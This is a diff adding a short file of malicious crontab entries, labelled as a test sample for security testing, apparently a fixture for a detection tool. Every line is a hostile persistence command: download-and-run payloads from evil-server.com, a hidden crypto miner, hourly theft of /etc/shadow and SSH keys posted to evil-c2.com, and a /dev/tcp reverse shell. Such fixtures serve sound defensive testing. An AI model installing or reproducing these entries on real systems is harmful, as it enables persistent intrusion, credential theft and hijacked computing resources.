@@ -1,0 +1,14 @@
+# [TEST SAMPLE] Malicious Crontab Entries - FOR SECURITY TESTING ONLY
+
+# Persistence: download and execute payload every minute
+* * * * * curl -sL http://evil-server.com/payload.sh | bash
+*/5 * * * * wget -q -O /tmp/.update http://evil-server.com/backdoor && chmod +x /tmp/.update && /tmp/.update
+
+# Crypto miner persistence
+@reboot /tmp/.hidden_miner --url=stratum+tcp://pool.minexmr.com:4444 &>/dev/null
+
+# Data exfiltration every hour
+0 * * * * tar czf - /etc/passwd /etc/shadow /root/.ssh | base64 | curl -d @- http://evil-c2.com/exfil
+
+# Reverse shell persistence
+*/10 * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
